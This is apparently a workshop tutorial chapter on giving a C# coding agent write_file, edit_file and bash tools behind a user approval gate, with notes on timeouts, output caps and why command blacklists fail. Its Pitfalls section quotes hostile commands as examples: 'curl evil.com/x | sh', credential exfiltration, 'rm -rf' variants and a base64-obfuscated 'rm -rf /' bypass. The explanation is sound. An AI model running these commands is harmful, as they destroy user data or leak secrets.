# Step 04 — Mutation tools: `write_file`, `edit_file`, `bash`

> *Goal: the agent stops being read-only. By the end of this step it can create files, edit them, and run shell commands — every call gated by Step 3's approval prompt.*

This is the moment "this is an agent" stops being a useful frame, because the agent now does *real work* on your machine. The plumbing was Step 3; this step is the payoff. We delete `simulate_action`, register three new tools, and the existing `ToolApprovalAgent` + harness round-trip handle them with no new code.

It's also the step with the largest **risk delta** of any in the workshop. `bash` in particular can do anything your user account can. Read [the Pitfalls section](#pitfalls) before you live-test this on your real home directory.

## What you'll have at the end

```
you > create /tmp/note.txt with the content "hello from claude"
claude > 
  approve write_file(path="/tmp/note.txt", contents="hello from claude")? [y/N]: y
  → approved

[write_file: path="/tmp/note.txt", contents="hello from claude"]
Done — wrote 17 bytes to /tmp/note.txt.

you > now change "claude" to "agent" in that file
claude > 
  approve edit_file(path="/tmp/note.txt", old_string="claude", new_string="agent")? [y/N]: y
  → approved

[edit_file: path="/tmp/note.txt", old_string="claude", new_string="agent"]
Done — replaced 1 occurrence in /tmp/note.txt.

you > confirm by running cat on it
claude > 
  approve bash(command="cat /tmp/note.txt")? [y/N]: y
  → approved

[bash: command="cat /tmp/note.txt"]
The file contains: "hello from agent".
```

Three approvals, three real mutations, one read. **The agent did the work; you held the floor on every irreversible step.**

## MAF concepts introduced

This step adds zero new MAF concepts. That's the point — Step 3's gate was the prerequisite, and now we cash in. What it teaches is *how the gate scales*: every mutation tool is one line in `AgentBuilder` (`new ApprovalRequiredAIFunction(AIFunctionFactory.Create(method))`) and the harness handles all of them uniformly.

| Concept (review) | What it does in Step 4 |
|---|---|
| `ApprovalRequiredAIFunction` | Wraps each new tool. The set of gated tools is now `{write_file, edit_file, bash}`; read-only tools stay un-wrapped. |
| `ToolApprovalAgent` | Unchanged. Already in place from Step 3. |
| `ChatLoop`'s multi-turn round-trip | Unchanged. Already handles approval batches; multi-tool turns now work for real mutations as well as for the demo. |

## Setup

No new dependencies. Three new files, one delete:

```
delete:  Tools/SimulateAction.cs           ← throwaway demo from Step 3
add:     Tools/WriteFile.cs
add:     Tools/EditFile.cs
add:     Tools/Bash.cs
```

## Walkthrough

### `write_file` — create or overwrite a file

*In [`Tools/WriteFile.cs`](../Tools/WriteFile.cs).*

```csharp
[Description("Write text content to a file. Overwrites the file if it exists. " +
             "Creates missing parent directories. " +
             "Cap: 100KB (UTF-8 bytes). " +
             "Returns 'wrote N bytes to <path>' on success or 'error: ...' on failure.")]
public static string Run(string path, string contents) { /* ... */ }
```

Three small calls each saying something:

1. **Overwrite without warning.** The user already saw the prompt; that's the safety. Asking again "are you sure you want to overwrite?" inside the tool would be redundant — and the model can't answer it. **Don't put gates inside the tool when the gate is in the harness.**
2. **Create parent directories.** `write_file("a/b/c/file.txt", ...)` works without a separate `mkdir` step. This is workshop-friendly: more capability per tool, less time spent on tool-call coordination.
3. **100KB cap, matching `read_file`.** Asymmetric caps (read 100KB, write unbounded) would be surprising. Models that accidentally splat huge payloads get a clear error pointing at the limit.

### `edit_file` — literal find-and-replace

*In [`Tools/EditFile.cs`](../Tools/EditFile.cs).*

```csharp
public static string Run(
    string path,
    string old_string,
    string new_string,
    bool replace_all = false) { /* ... */ }
```

The implementation has one important rule:

```csharp
var count = CountOccurrences(content, old_string);

if (count == 0)
    return $"error: old_string not found in '{path}'";

if (count > 1 && !replace_all)
    return $"error: old_string appears {count} times in '{path}' — supply more context " +
           "or set replace_all=true to replace every occurrence";
```

**Ambiguity is an error, not a guess.** If the model says "replace `import x`" and that line appears in three files' worth of imports, the right behavior isn't to pick the first one — it's to refuse and force the model to give more context. The error message tells the model *how many* matches it found, which is enough for it to either expand `old_string` to include surrounding lines or set `replace_all=true` if a global rename was actually the intent.

This pattern is what makes Claude Code's Edit tool reliable: small unambiguous edits, fail loudly on anything else. **Don't be clever in tool implementations; let the model handle the cleverness with better arguments.**

### `bash` — the dangerous one

*In [`Tools/Bash.cs`](../Tools/Bash.cs).*

```csharp
[Description("Run a shell command via /bin/bash -c. Returns combined stdout+stderr. " +
             "Times out after 30 seconds. Output is capped at 50KB (truncated). " +
             "WARNING: this is unrestricted shell access — the model can do anything " +
             "the user account can (delete files, modify configs, network requests, etc.). " +
             "Always review the command shown in the approval prompt before approving. " +
             "Prefer specific commands over open-ended ones; prefer the file tools " +
             "(write_file, edit_file) when an edit is what you need.")]
public static string Run(string command, string cwd = ".") { /* ... */ }
```

A few deliberate choices, each one a small lesson:

**The `WARNING` in the description is for the model.** The model reads tool descriptions every turn. Saying "this is dangerous" in plain prose biases it toward narrower, safer commands. It's not safety — it's a soft nudge. The hard safety is the gate.

**The 30-second timeout uses `Process.WaitForExit(TimeoutMs)` + `Kill(entireProcessTree: true)`.** Without `entireProcessTree`, `bash -c "sleep 100 & wait"` would leak a child. With it, the whole process group goes when we time out.

**The 50KB output cap is enforced inline, not after-the-fact.** A `yes | head -c 1G` would produce a gigabyte of output if we read it all and *then* truncated. Instead we accumulate into a `StringBuilder` with a lock and stop appending once the cap is hit:

```csharp
void Append(string? line)
{
    if (line is null) return;
    lock (lockObj)
    {
        if (truncated) return;
        if (output.Length + line.Length + 1 > MaxOutputBytes)
        {
            var room = MaxOutputBytes - output.Length;
            if (room > 0) output.Append(line.AsSpan(0, Math.Min(room, line.Length)));
            output.Append("\n... (truncated; output exceeded 50KB)");
            truncated = true;
            return;
        }
        output.AppendLine(line);
    }
}
```

stdout and stderr can interleave — both call `Append`, both lock — so the output reads in the order the kernel delivered it. Mostly. Race conditions on small buffers are a thing; for a workshop, "good enough."

**No command parsing or pattern blacklist.** I considered them and rejected them in the [Pitfalls](#pitfalls). Static analysis of shell strings is defeated by absolute paths, command substitution, `eval`, and so on; a partial blacklist is worse than none because it teaches a false sense of safety.

### Wiring it all up

*In [`Agent/AgentBuilder.cs`](../Agent/AgentBuilder.cs).*

```csharp
var tools = new List<AITool>
{
    // Read-only — auto-invoke.
    AIFunctionFactory.Create(ReadFile.Read, name: "read_file"),
    AIFunctionFactory.Create(ListDir.Run,  name: "list_dir"),
    AIFunctionFactory.Create(Glob.Run,     name: "glob"),
    AIFunctionFactory.Create(Grep.Run,     name: "grep"),

    // Mutation — every call routes through the approval gate.
    new ApprovalRequiredAIFunction(
        AIFunctionFactory.Create(WriteFile.Run, name: "write_file")),
    new ApprovalRequiredAIFunction(
        AIFunctionFactory.Create(EditFile.Run,  name: "edit_file")),
    new ApprovalRequiredAIFunction(
        AIFunctionFactory.Create(Bash.Run,      name: "bash")),
};
```

That's the entire wiring change. The visual split (read-only vs mutation) is for the reader, not the framework — the framework just sees a list of `AITool`s, and it's the `ApprovalRequiredAIFunction` wrapper that flips the gate flag per tool.

The instructions also got an update:

> Read-only navigation: `read_file`, `list_dir`, `glob`, `grep` — auto-invoked.
> Mutation tools: `write_file` (create/overwrite), `edit_file` (literal find-and-replace in an existing file), `bash` (run shell commands) — every call requires explicit user approval.
> Prefer the smallest tool that does the job: `edit_file` for targeted changes, `write_file` for new files or full rewrites, `bash` only for operations the file tools can't do (running tests, git, build, etc.). Write specific, narrow shell commands — they are easier for the user to read and approve.

The "narrow shell commands" line matters. Models that have `bash` will reach for it as a Swiss-army-knife: `bash("cat README.md")` instead of `read_file("README.md")`. That works but bypasses the more efficient tool — and adds an approval prompt for what should be a free read. The instruction nudges the model toward the right tool for the job.

## Verify

```bash
dotnet build
dotnet test          # 68 unit tests now (44 prior + 24 new across WriteFile/EditFile/Bash)
```

Live tests, with `ANTHROPIC_API_KEY` exported (or in `.env`):

```bash
mkdir /tmp/scratch && dotnet run

you > create /tmp/scratch/note.txt with "hi from claude"
# Approve: y
# Expect: write succeeds, file exists

you > /clear
you > change "claude" to "agent" in /tmp/scratch/note.txt
# Approve: y
# Expect: edit succeeds

you > /clear
you > run "echo hello-from-bash"
# Approve: y
# Expect: bash output relayed
```

You can also exercise the **deny path**:

```
you > delete the build directory using bash
# Approve prompt fires; press Enter (empty → denied)
# Expect: model acknowledges the denial without retrying
```

…and the **multi-tool-in-one-turn** path:

```
you > use bash to count lines in Program.cs and write the count to /tmp/scratch/count.txt
# Two approvals (one bash, one write_file), each with its own [y/N]
```

In our smoke tests, the model occasionally tried a destructive variant first, got approved, the tool errored ("path is a directory"), and the model then *re-tried* with a corrected path — which fired *another* approval prompt. That self-correction loop is the agentic behaviour Step 4 was designed to enable. **The gate makes it safe to let the model iterate without baby-sitting every keystroke.**

## Pitfalls

### `bash` is qualitatively more dangerous than the file tools

`write_file` and `edit_file` have bounded blast radius — one file per call, recoverable from git or backups. `bash` is unbounded: `rm -rf ~`, `curl evil.com/x | sh`, exfiltrating `~/.aws/credentials`. **The gate is the only safety mechanism**, and it depends on you actually reading the prompt.

If you're paranoid: run the workshop in a VM, a fresh user account, or a container. The chapter's been deliberately framed to encourage that.

### Pattern blacklisting is theatre

Refusing `rm -rf /` and similar literal patterns *feels* like safety but doesn't add any. Bypasses are trivial: `rm -rf -- /`, `find / -delete`, `bash -c $(echo cm0gLXJmIC8K | base64 -d)`, etc. Worse, *partial* blacklists teach the user to trust the tool more than they should. We don't ship one.

### Don't put gates inside the tools when there's a gate in the harness

A common instinct: "let me also add a confirmation in `write_file` for huge payloads." Resist. The harness already prompts the user, the user has the full call info, and the tool can't render a richer dialog than the harness can. **The gate belongs in one place.**

### Ambiguity-is-error scales better than first-match

`edit_file`'s "fail when `old_string` appears multiple times" rule is annoying maybe one in ten times — and saves you from silent wrong-place edits the other nine. The error message even tells the model how many matches it found, so it knows what to do next. Don't relax this without good reason.

### `entireProcessTree: true` matters

`Process.Kill()` without `entireProcessTree: true` only kills the bash process, not its children. So `bash -c "sleep 100 & wait"` would leak the `sleep`. Always use the tree variant when killing on timeout.

### Step 1's promise about rendering FunctionResultContent

Step 1's chapter said Step 4 would render tool-result content in the chat. *We're not doing that.* Reasons: bash stdout dumped into a streaming reply is messier than it sounds, and read_file/list_dir/glob/grep would each spam huge results. The model already incorporates the result into its next text chunk. Step 9 (streaming polish) is the better home for any rich-result UI.

### `cat <file>` is `bash`'s temptation

Models with `bash` reach for `cat`/`grep` shell commands instead of the read-only tools, even though the tools are cheaper (no approval needed) and bounded (size-capped). The instruction text nudges the model away, but it's a real failure mode. Step 5's logging will make this visible per turn.

## Stretch exercises

- **Path scope.** Add a flag (`--scope=cwd`) that refuses any `write_file` / `edit_file` / `bash` referencing a path outside the current working directory. Defense-in-depth on top of the gate. Not safety, but a cheaper-than-VM second layer.
- **Diff preview before approval.** Before prompting, render `edit_file`'s old → new as a unified diff. Gives the user something to actually read.
- **`bash` history file.** Append every approved command to `bash-history.log` for post-mortems. The line you wish you'd written when something goes wrong.
- **`write_file` size cap as a parameter.** Let the user override (`MAX_WRITE_BYTES=500_000`) for legitimate large-payload work.
- **Sandbox with Docker.** Replace `/bin/bash -c` with `docker run --rm -v "$cwd":/work -w /work busybox sh -c …`. Real isolation. Slow startup but worth it for scary workflows.
- **Detect git-relevant operations.** When the model uses `bash` with `git`, automatically increase prompt verbosity ("this will modify git state").

## Where the seams are

What this step deliberately doesn't have:

- **No path scoping.** Stretch exercise; the gate is the boundary.
- **No diff preview.** Same — Step 9 territory.
- **No sandboxing.** Out of scope; a workshop step about safety primitives, not safety implementations.
- **No "always approve this command"** — Step 7 (slash commands) handles per-tool memory.
- **No cost / token tracking on tool calls.** Step 5.
- **No streaming progress for long-running bash.** The 30s timeout is the workshop's answer; a real implementation would stream stdout chunks.
- **No `simulate_action`.** Deleted with this step's commit. It served its purpose at Step 3.

## Next

→ **Step 05 — Logging + OpenTelemetry + per-turn token/cost** *(planned)*

Up next: observability. Now that the agent can do real work, knowing *what it did* — which tools, how often, how many tokens — is the foundation for everything else. Step 5 wires it before the harness gets more complex; debugging Step 6 onwards without a log is misery.
